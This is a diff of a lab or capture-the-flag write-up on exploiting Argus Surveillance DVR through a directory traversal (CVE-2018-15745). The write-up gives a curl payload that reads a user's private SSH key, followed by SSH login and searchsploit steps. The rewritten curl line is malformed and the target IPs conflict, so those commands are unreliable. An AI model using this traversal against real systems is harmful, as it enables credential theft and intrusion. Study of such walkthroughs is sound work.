@@ -198,14 +198,14 @@ Enumerated top 200 UDP ports:
 
 ---
 
-# Enumeration
 ## Port 8080
 
-#### - Per the NMAP scan I navigated to "http://192.168.109.179:8080" and found the following webpage:
-
+- We browse to "http://192.168.109.179:8080" based on the NMAP scan, and I discovered the following webpage:
+  
 ![](Images/Pasted%20image%2020221009165921.png)
-#### - Navigated to the "Users" section and found the following user "viewer"
 
+- We discover the user viewer by navigating to the "Users" section.
+  
 ![](Images/Pasted%20image%2020221009183244.png)
 
 
@@ -214,17 +214,16 @@ Enumerated top 200 UDP ports:
 # Exploitation
 ## CVE 2018-15745 - Argus Surveillance DVR 4.0.0.0 - Directory Traversal
 
-#### - Typed "searchsploit argus surveillance" and found the following exploit:
-
+- We discover the following exploit by typing "searchsploit Argus Surveillance":
+  
 ![](Images/Pasted%20image%2020221009190548.png)
 
-#### - Typed "searchsploit -m windows_x86/webapps/45296.txt" and found the following ouput showing a directory Traversal exploit:
-
+- We enter “searchsploit -m windows_x86/webapps/45296.txt” to download the exploit onto our Kali machine.
+  
 ![](Images/Pasted%20image%2020221009190910.png)
-#WindowsDirectoryTraversalExploit
 
-#### - Googled "url encoded characters" and found the following webpage showing character "." will be used as %2E and character "/" used as %2F:
-
+- We look into “url encoded characters” on Google and discover the following webpage, which indicates the character “/” url encoded is %2F:
+  
 ![](Images/Pasted%20image%2020221009191130.png)
 
 ![](Images/Pasted%20image%2020221009191245.png)
@@ -232,17 +231,20 @@ Enumerated top 200 UDP ports:
 ![](Images/Pasted%20image%2020221009191343.png)
 #URLencodedCharacters
 
-#### - Typed the following on kali machine to retreive private ssh key for the found user "viewer" found previously "curl "http://[Kali IP]:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F%2Essh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" > id_rsa"
+- On the Kali machine, we enter the following to get the private SSH key for the user "viewer" that we previously located:
+
+"curl "http://WEBACCOUNT.CGI://[Kali IP]:8080/OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F%2Essh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" > id_rsa"
 
 ![](Images/Pasted%20image%2020221009191611.png)
 #WindowsDirectoryTraversalPrivateSSHKey
 
-#### - Typed "cat id_rsa" and found the following private ssh key:
-
+- We discover the following private SSH key by typing "cat id_rsa":
+      
 ![](Images/Pasted%20image%2020221009191813.png)
 
-#### - Typed "ssh viewer@192.168.122.179 -i id_rsa" and was connected to an ssh session as user "viewer":
-![](Images/Pasted%20image%2020221009191954.png)
+- We open an SSH session as user “viewer” by typing “ssh viewer@192.168.122.179 -i id_rsa”:
+
+  ![](Images/Pasted%20image%2020221009191954.png)
 
 
 ---
@@ -250,12 +252,12 @@ Enumerated top 200 UDP ports:
 # Privilege Escalation
 ## Local Enumeration
 
-#### - Per the previous searchsploit we ran for argus surveillance we found the following "Weak password encryption" python script:
-
+- The following Python script with "weak password encryption" was discovered by us using the prior searchploit we conducted for Argus surveillance:
+  
 ![](Images/Pasted%20image%2020221009192206.png)
 
-#### - Typed "searchsploit -m windows/local/50130.py" to copy the python script on my kali machine
-
+- To copy the Python script to our Kali computer, we type "searchsploit -m windows/local/50130.py".
+  
 #### - Typed "cat 50130.py" and found the following contents:
 
 ![](Images/Pasted%20image%2020221009192437.png)
